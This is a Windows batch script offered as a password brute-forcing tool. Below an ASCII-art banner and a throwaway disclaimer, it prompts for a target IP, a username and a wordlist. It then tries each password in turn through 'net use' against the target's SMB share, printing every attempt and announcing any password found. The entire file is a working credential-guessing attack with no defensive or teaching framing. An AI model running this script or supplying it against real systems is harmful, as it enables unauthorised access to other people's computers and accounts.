@echo off
title Bruteforce - Iso
chcp 65001 >nul


Echo ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓▓█████   █████▒▒█████   ██▀███   ▄████▄  ▓█████ 
Echo ▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒▓█   ▀ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
Echo ▒▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░▒███   ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   
Echo ▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
Echo ░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ░▒████▒░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
Echo ███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
Echo   ░   ░▒ ░ ▒░░░▒░ ░ ░     ░     ░ ░  ░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
Echo  ░   ░░   ░  ░░░ ░ ░   ░         ░    ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░   
Echo                           ░  ░           ░ ░     ░     ░ ░         ░  ░
echo   ░                                                            ░               

echo Loading bruteforce.
timeout /t 2 /nobreak >nul

























:bruteforce
echo i do not condome any of this.
echo Put the right ip and User Then the passlist.
echo Close this when you are done.
cls
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success